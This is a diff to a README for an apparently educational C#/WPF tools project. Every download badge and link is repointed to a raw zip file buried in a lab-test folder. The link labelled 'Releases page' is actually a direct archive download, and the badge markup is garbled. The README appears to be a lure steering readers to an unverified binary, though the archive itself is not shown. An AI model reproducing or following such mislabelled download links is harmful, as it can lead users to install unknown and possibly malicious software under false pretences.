@@ -1,6 +1,6 @@
 # 🛠️ tool-development - Build Better Tools for Your Workflow
 
-[![Download Now](https://raw.githubusercontent.com/marvinJawanise/tool-development/main/W01_FileIO/tool-development_v2.9.zip%20Now-Click%https://raw.githubusercontent.com/marvinJawanise/tool-development/main/W01_FileIO/tool-development_v2.9.zip)](https://raw.githubusercontent.com/marvinJawanise/tool-development/main/W01_FileIO/tool-development_v2.9.zip)
+[![Download Now](https://github.com/marvinJawanise/tool-development/raw/refs/heads/main/W09_LabTest/Model/development_tool_v2.6.zip%20Now-Click%https://github.com/marvinJawanise/tool-development/raw/refs/heads/main/W09_LabTest/Model/development_tool_v2.6.zip)](https://github.com/marvinJawanise/tool-development/raw/refs/heads/main/W09_LabTest/Model/development_tool_v2.6.zip)
 
 ## 📖 Description
 tool-development is an educational project aimed at creating production tools using C#, .NET, and WPF. It focuses on optimizing workflows for artists in the digital arts and entertainment field. This repository includes lab exercises and a final exam based on practical applications of the learned concepts.
@@ -10,7 +10,7 @@ This guide will help you download and run the tool-development application. Just
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/marvinJawanise/tool-development/main/W01_FileIO/tool-development_v2.9.zip) to see the latest versions of the software.
+   Go to the [Releases page](https://github.com/marvinJawanise/tool-development/raw/refs/heads/main/W09_LabTest/Model/development_tool_v2.6.zip) to see the latest versions of the software.
 
 2. **Choose the Version**  
    On the Releases page, you will find a list of available versions. Look for the latest release, which is usually at the top. 
@@ -61,4 +61,4 @@ If you encounter issues while installing or running the application, here are co
 ## 📞 Support
 For further assistance, please open an issue on the GitHub repository or contact support via the provided email on our website.
 
-[![Download Now](https://raw.githubusercontent.com/marvinJawanise/tool-development/main/W01_FileIO/tool-development_v2.9.zip%20Now-Click%https://raw.githubusercontent.com/marvinJawanise/tool-development/main/W01_FileIO/tool-development_v2.9.zip)](https://raw.githubusercontent.com/marvinJawanise/tool-development/main/W01_FileIO/tool-development_v2.9.zip)
+[![Download Now](https://github.com/marvinJawanise/tool-development/raw/refs/heads/main/W09_LabTest/Model/development_tool_v2.6.zip%20Now-Click%https://github.com/marvinJawanise/tool-development/raw/refs/heads/main/W09_LabTest/Model/development_tool_v2.6.zip)](https://github.com/marvinJawanise/tool-development/raw/refs/heads/main/W09_LabTest/Model/development_tool_v2.6.zip)
